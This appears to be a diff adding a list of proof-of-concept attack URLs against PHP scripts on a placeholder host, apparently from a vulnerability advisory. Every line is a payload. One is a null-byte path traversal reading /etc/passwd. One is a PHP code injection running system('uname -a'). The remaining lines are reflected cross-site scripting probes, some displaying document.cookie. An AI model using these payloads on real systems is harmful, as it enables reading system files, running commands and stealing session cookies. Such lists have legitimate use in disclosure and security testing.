@@ -1,0 +1,9 @@
+http://www.example.com/translator.php?dir=/etc/passwd%00
+http://www.example.com/translator.php?lang=zh_CN&amp;cmd=upd&amp;edit=$GET[%22lang%22];system(%22uname%20-a%22);
+http://www.example.com/integrator.php?lang=&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
+http://www.example.com/command.php?command=New+Password&amp;uid=&amp;token=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/command.php?command=Folder%20Properties&amp;nid_acl=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/index.php?target=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/command.php?command=Modify%20User&amp;uid=%22%3E%3Cscript%3Ealert(&#039;xss&#039;)%3C/script%3E
+
+
